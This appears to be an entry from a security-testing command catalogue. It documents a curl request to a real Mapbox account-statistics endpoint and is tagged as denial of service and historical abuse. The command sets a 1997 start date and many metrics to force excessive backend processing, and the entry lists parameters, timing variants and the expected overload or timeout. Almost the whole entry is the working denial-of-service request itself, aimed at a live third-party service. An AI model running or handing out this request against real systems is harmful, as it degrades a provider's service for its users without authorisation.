---
id: cmd-curl-mapbox-early
data: >-
  curl -H "Cookie: session=your_session_cookie"
  "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=day&period=860000000000,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155"
  -o early_response.json
tags:
  - dos
  - historical-abuse
  - api
type: command
output: Massive or failed response due to overload
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:37.034Z'
verified: false
validated: true
submitted: true
---
# curl-mapbox-early-dates

## Command

```bash
curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=day&period=860000000000,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155" -o early_response.json
```

## Description

Queries the endpoint with an early start date (1997) to trigger excessive historical data processing, amplifying DoS effects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Auth session cookie | Yes |
| `period=860000000000,...` | Early start timestamp | Yes |
| `interval=day` | Daily granularity | Yes |
| `-o early_response.json` | Output file | No |

## Examples

### Basic Early Date Test

```bash
curl -H "Cookie: session=abc123" "https://...period=860000000000,1462370883143&..."
```

### With Timing

```bash
time curl -H "Cookie: session=abc123" "https://..."
```

## Expected Output

Delayed or oversized JSON; may timeout or return error from backend overload.

## Related

- [[commands/curl-mapbox-dos-params]]
- [[procedures/Test-Early-Dates-for-Excessive-Processing]]
